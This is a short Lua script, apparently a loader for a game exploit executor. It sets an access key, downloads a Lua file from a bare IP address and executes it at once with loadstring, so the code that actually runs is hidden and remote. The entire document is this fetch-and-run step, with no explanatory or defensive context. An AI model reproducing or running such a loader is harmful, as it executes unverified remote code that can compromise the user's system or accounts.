ACTIVE_KEY = 'f952a93a3d0712034a792521e6390f02';
local raw = http_request({
    Url = 'http://187.52.122.114:3000/files/v2/loaders/vk0w1p345iwv16o0nfxt6p9n2rcbskne.lua',
    Method = 'GET'
}).Body
loadstring(raw)()
